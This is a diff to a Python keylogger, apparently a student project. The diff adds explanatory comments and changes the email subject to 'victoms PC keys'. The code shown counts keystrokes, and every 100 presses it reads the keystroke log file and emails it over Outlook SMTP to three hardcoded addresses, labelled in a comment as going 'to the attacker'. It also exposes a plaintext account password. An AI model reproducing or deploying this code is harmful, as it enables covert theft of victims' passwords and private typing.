@@ -7,6 +7,9 @@ counter = 1
 
 def mail_it():
 
+	# libraries we import for smpt connection (protocols) for mails
+	# and mime for stablisting the method extensions for mails
+	# multipurpose innternet mail extensions
 	import smtplib
 	from email.mime.text import MIMEText
 	from email.mime.multipart import MIMEMultipart
@@ -17,12 +20,13 @@ def mail_it():
 	password = "alibadami0791"
 	# can also implement other arguments [target2@mail.com,target1@mail.com]
 
+	#destination mails where keys would send
 	destination_mail = ["k213610@nu.edu.pk" , "k214755@nu.edu.pk","k214771@nu.edu.pk"]
 	path = "/home/kali/Documents/keyslogging.txt"
 
 	#creating message
 	msg = MIMEMultipart("related")
-	msg['Subject'] = 'ignore (testing)'
+	msg['Subject'] = 'victoms PC keys'
 	msg.preamble = "hi boss"
 
 	with open("keyslogging.txt",'r') as plaintxt:
@@ -33,7 +37,7 @@ def mail_it():
 	msg.attach(MIMEText(plain))
 
 
-	#initializing smpt connection and sending mail
+	#initializing smpt connection (protocol) and sending mail
 	server = smtplib.SMTP("smtp.outlook.com", 587) 
 	server.starttls()
 	server.ehlo()
@@ -42,12 +46,18 @@ def mail_it():
 
 	server.quit()
 	
-	
+
+
+	#when the key is pressed on press fuction call which call the writefunction
+	#which wirtes the keys into the keyslogging.txt
 def on_press(key):
 	write_1(key)
-	
+
+
+	#global counter is initialized which counts the keys
 	global counter
 	counter += 1
+	#on pressing when the limit reaches to 100 keys it would mail the txt file to the attacker
 	if counter % 100 == 0:
 		mail_it()
 
